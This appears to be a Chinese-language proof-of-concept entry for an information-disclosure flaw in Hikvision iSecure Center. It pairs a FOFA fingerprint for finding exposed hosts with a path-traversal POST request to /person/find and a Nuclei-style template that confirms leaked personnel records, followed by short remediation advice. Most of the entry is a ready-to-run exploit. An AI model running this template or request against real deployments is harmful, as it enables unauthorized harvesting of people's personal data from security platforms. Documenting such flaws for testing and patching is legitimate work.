# 海康威视iSecureCenter综合安防管理平台find信息泄漏

- **系统**：海康　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`POST /isupm/api/api/..;/..;/person/find HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app.name=="Hikvision 海康威视 iSecure Center"
2、隐患url,复现如下
id: hikvision-find-info
info:
name: hikvision-find-info
author: xxxx
severity: high
description: 海康威视综合安防find信息泄露漏洞
http:
- raw:
-
Content-Type: application/json;charset=utf-8
Host: {{Hostname}}
Content-Length: 95
{"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
matchers:
- type: dsl
dsl:
- 'status_code==200 && contains_all(body,"SUCCESS!") && contains_all(body,"\"code\":\"0\"") && contains_all(body,"personIndexCode")'
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。